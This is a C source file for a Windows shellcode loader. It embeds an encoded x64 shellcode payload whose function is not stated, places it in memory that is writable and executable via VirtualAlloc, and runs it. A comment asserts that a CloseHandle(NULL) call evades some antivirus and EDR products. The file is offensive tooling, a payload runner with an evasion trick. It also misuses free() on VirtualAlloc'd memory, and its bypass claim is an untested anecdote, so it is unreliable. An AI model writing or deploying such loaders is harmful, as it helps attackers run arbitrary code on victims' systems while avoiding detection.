/*
    Copyright (C) 2023  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <string.h>
#include <windows.h>

unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xb2\xad\xc6\xa4\xf4\xd3\x22\x58\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4e\xe5\x45"
"\x40\x04\x3b\xe2\x58\xb2\xad\x87\xf5\xb5\x83\x70\x09\xe4"
"\xe5\xf7\x76\x91\x9b\xa9\x0a\xd2\xe5\x4d\xf6\xec\x9b\xa9"
"\x0a\x92\xe5\x4d\xd6\xa4\x9b\x2d\xef\xf8\xe7\x8b\x95\x3d"
"\x9b\x13\x98\x1e\x91\xa7\xd8\xf6\xff\x02\x19\x73\x64\xcb"
"\xe5\xf5\x12\xc0\xb5\xe0\xec\x97\xec\x7f\x81\x02\xd3\xf0"
"\x91\x8e\xa5\x24\x58\xa2\xd0\xb2\xad\xc6\xec\x71\x13\x56"
"\x3f\xfa\xac\x16\xf4\x7f\x9b\x3a\x1c\x39\xed\xe6\xed\xf5"
"\x03\xc1\x0e\xfa\x52\x0f\xe5\x7f\xe7\xaa\x10\xb3\x7b\x8b"
"\x95\x3d\x9b\x13\x98\x1e\xec\x07\x6d\xf9\x92\x23\x99\x8a"
"\x4d\xb3\x55\xb8\xd0\x6e\x7c\xba\xe8\xff\x75\x81\x0b\x7a"
"\x1c\x39\xed\xe2\xed\xf5\x03\x44\x19\x39\xa1\x8e\xe0\x7f"
"\x93\x3e\x11\xb3\x7d\x87\x2f\xf0\x5b\x6a\x59\x62\xec\x9e"
"\xe5\xac\x8d\x7b\x02\xf3\xf5\x87\xfd\xb5\x89\x6a\xdb\x5e"
"\x8d\x87\xf6\x0b\x33\x7a\x19\xeb\xf7\x8e\x2f\xe6\x3a\x75"
"\xa7\x4d\x52\x9b\xec\x4e\xd2\x22\x58\xb2\xad\xc6\xa4\xf4"
"\x9b\xaf\xd5\xb3\xac\xc6\xa4\xb5\x69\x13\xd3\xdd\x2a\x39"
"\x71\x4f\x33\x3f\x72\xb8\xec\x7c\x02\x61\x6e\xbf\xa7\x67"
"\xe5\x45\x60\xdc\xef\x24\x24\xb8\x2d\x3d\x44\x81\xd6\x99"
"\x1f\xa1\xdf\xa9\xce\xf4\x8a\x63\xd1\x68\x52\x13\xc7\x95"
"\xbf\x41\x76\xd7\xd5\xa3\xa4\xf4\xd3\x22\x58";

int main(int argc, char **argv) {
    void *shellcode_pointer = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, 0x40);
    if (shellcode_pointer == NULL) {
        fputs("NULL shellcode pointer", stderr);
        return 2;
    }

    memcpy(shellcode_pointer, shellcode, sizeof(shellcode));
    ((void(*)())shellcode_pointer)();

    free(shellcode_pointer);
    CloseHandle(NULL);  // this line bypass some Antivirus and EDR detection (i don't have any explanation for EDR bypass, i just observed it)
    return 0;
}
